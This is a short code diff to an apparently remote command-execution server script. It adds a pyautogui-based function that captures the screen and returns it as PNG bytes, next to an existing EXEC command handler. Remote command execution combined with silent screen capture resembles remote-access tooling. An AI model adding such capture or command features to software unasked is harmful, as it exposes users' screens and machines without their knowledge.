@@ -3,6 +3,8 @@ import glob
 import shlex
 import shutil
 import logging
+import pyautogui
+import io
 import subprocess
 LOG_PATH = os.path.join(os.path.dirname(__file__), 'serverpys.log')
 logging.basicConfig(
@@ -87,3 +89,14 @@ def EXEC(target):
         return "Error executing command: " + target
 def EXIT():
     return "Thank you for executing your command"
+
+def Screeen_Shot()-> bytes:
+    try:
+        screenshot = pyautogui.screenshot()
+        buf = io.BytesIO()
+        screenshot.save(buf, format = "PNG")
+        img_bytes = buf.getvalue()
+        return img_bytes
+    except Exception as e:
+        logging.error(e)
+        return b"Error getting screenshot"
